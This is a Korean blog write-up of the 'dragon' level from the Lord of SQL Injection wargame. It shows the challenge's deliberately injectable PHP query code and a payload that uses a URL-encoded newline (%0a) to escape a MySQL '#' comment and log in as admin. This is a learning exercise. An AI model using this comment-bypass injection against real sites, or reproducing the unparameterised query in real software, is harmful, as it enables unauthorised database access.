---
title: "[Lord of SQL Injection] LoS - dragon 문제풀이"
date: 2018-08-15
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제는 `dragon`이다.
메인 이미지가 `용이 산다` 웹툰의 `마리`다.
대존귀탱 ㅠㅠ

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------------------------------
query : select id from prob_dragon where id='guest'# and pw=''
-------------------------------------------------------------------------------------

Hello guest
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

이번 문제에서는 쿼리문 중간에 `#`이 들어가 있다.
`#`은 `MySQL`에서 주석을 의미한다.
처음에는 이 주석을 어떻게 우회할 수 있지 않을까 생각했다.
그래서 이것저것 찾다가 `executabl comments`를 찾게 되었다.

`MySQL` 에서 주석이 여러개가 있는데, 그 중에 `/* */`이 있다.
이 때, `/*! QUERY */` 이런식으로 안에 느낌표를 넣어주면, 해당 쿼리를 실행할 수 있다고 한다.
쨌든 이건 문제 풀이와는 상관 없다.
주석을 우회할 수 없을까 계속 고민하다가 서버에서 `MySQL`을 실행시키고 쿼리를 여러개 테스트 해 보았다.  

```bash
mysql> select idx from board where idx=50# or idx=/*!####51*/;
    -> ;

mysql> select 1 from board where idx=50# or #idx=51;
    -> ;
```

이런 형태로 테스트를 해 보았는데, 한가지 특징이 나타났다.
잘 보면, `#` 이후는 다 주석처리가 됬다는 사실을 알 수 있다.
때문에 쿼리가 완성이 되지 않았기 때문에 다음 줄을 입력하라고 떴고, 거기에 `;`을 입력 해 쿼리를 완성시켜주었더니 정상적으로 쿼리가 실행되었다.
즉, `#`은 `한 줄짜리 주석`이며, `MySQL`은 `여러 줄에 걸쳐` 쿼리를 작성할 수 있다.
이번에는 이 점을 이용해서 문제를 풀었다.
현재 쿼리는 다음과 같다.

```mysql
select id from prob_dragon where id='guest'# and pw=''
```

그런데 만약 여기서 `pw`에 `%0a`를 입력 해 개행한다면 다음과 같이 구성 될 것이다.  

```mysql
select id from prob_dragon where id='guest'# and pw='
'
```

이 때, 다음 줄은 주석이 아니므로 정상적으로 쿼리를 이어서 실행시킬 수 있게 된다.  

```mysql
select id from prob_dragon where id='guest'# and pw='
and pw=1 or id='admin'
```

따라서 위와 같이 쿼리를 구성한다면 다음 줄의 쿼리를 실행시킬 수 있다.
이를 위해 `URL`에 아래와 같이 입력 해 문제를 풀 수 있었다.

```plain
?pw=%0a and pw=1 or id='admin
```

---

```php
--------------------------------------------------------------------------------------------------------------------
query : select id from prob_dragon where id='guest'# and pw=' and pw=1 or id='admin'
--------------------------------------------------------------------------------------------------------------------

Hello admin
DRAGON Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

---

```plain
DRAGON Clear!!
```